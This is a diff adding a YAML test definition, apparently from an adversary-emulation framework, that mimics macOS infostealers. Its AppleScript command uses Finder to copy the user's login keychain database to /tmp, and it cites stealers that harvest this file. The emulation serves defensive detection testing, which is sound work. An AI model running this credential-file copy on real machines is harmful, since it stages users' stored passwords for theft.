@@ -1,0 +1,17 @@
+name: "Credentials from Password Stores: Keychain"
+tests:
+  - name: Copy login keychain database
+    language: AppleScript
+    references:
+      - https://www.elastic.co/security-labs/beyond-the-wail
+      - https://www.cyfirma.com/research/odyssey-stealer-the-rebrand-of-poseidon-stealer/
+    description: Copies the user's login keychain database to a staging directory using Finder. Stealers such as BANSHEE, Odyssey and Atomic collect login.keychain-db so the stored credentials can be decrypted offline once the account password is captured.
+    tcc_required: true
+    command: |
+      tell application "Finder"
+        set destinationFolderPath to POSIX file "#{destination_path}"
+        set keychainPath to (path to library folder from user domain as text) & "Keychains:login.keychain-db"
+        duplicate file keychainPath to folder destinationFolderPath with replacing
+      end tell
+    args:
+      destination_path: "/tmp"
